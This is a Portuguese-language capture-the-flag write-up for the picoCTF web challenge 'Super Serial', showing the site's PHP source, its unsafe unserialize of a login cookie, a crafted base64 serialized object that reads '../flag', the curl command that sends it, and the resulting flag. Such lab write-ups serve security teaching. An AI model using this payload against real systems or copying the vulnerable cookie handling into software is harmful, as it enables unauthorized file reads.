# Super Serial
###### Solved by @joaoselim
> This CTF is about Web

## About the challenge
A questão [Super Serial](https://play.picoctf.org/practice/challenge/180) possui o enunciado `Try to recover the flag stored on this website`.

Então puramente é dito para tentar encontrar a flag no site.

## Solution
Abrindo o link se encontra uma página de login básica

[![paginicial.png](https://i.postimg.cc/QdBKkgdP/paginicial.png)](https://postimg.cc/QF3MjT5k)

Verificando o diretório `/robots.txt` se encontra somente um caminho listado

[![robos.png](https://i.postimg.cc/tC6H3YHk/robos.png)](https://postimg.cc/F7hqmFzk)

`/admin.phps`, tentando acessar essa página, não se encontra nada.

Retornando à página inicial, ao se tentar inserir algum login e senha aparece que inserimos o login e senha errados, e surge um diretório novo, `index.php`

[![loginfail.png](https://i.postimg.cc/QCTxKmbk/loginfail.png)](https://postimg.cc/7Jqypgjf)

Então acessamos o código fonte dessa URL, adicionamos o `s` ao final ficando com `/index.phps`.

Assim chegando à
```
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Sign In</h5>
							<?php if (isset($msg)) echo $msg; ?>
							<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```

Logo no começo do código já é possível se indentificar dois diretórios, `cookie.php` e `authentication.php`.
Também se consegue ver a linha `$con = new SQLite3("../users.db");` que mostra que para se conectar ao SQL ira ser preciso subir um nível do diretório atual através de `../`, para poder acessar `/flag`.

Abrindo o `authentication.phps` é possível se entender que o script importa o `cookie.php` para a verificar se o usuário é admin

```
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```
Então é através dos cookies que será possível acessar o site.

Verificando então o `/cookie.phps`

```
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

É basicamente uma função para gerar um cookie que determine se é um admin ou um usuário.

Então resumidamente se sabe que em `index.php` se realiza um login e cria um cookie através do `cookie.php`. Em seguida o `authentication` lê o cookie e verifica se é um admin.
Portanto é preciso gerar um cookie que tenha um valor igual a `../flag` para se chegar onde esta a flag.

Através de um código php criado para gerar o valor desse cookie

[![geradorcookie.png](https://i.postimg.cc/L8V2CptG/geradorcookie.png)](https://postimg.cc/68TkqF1h)

Rodando ele em um compilador online, gera o valor de cookie:
```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

Para acessar usando o cookie, se utiliza o curl, através do CMD.

Então abrindo o prompt de comando e inserindo o comando:
```
curl -s -b "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" http://mercury.picoctf.net:5428/authentication.php
```
Se tem como reposta:

<img width="880" height="253" alt="image" src="https://github.com/user-attachments/assets/1bc5bb85-14bc-4139-b7b3-feef7ace3997" />

Assim conseguindo a flag:
>'picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}'
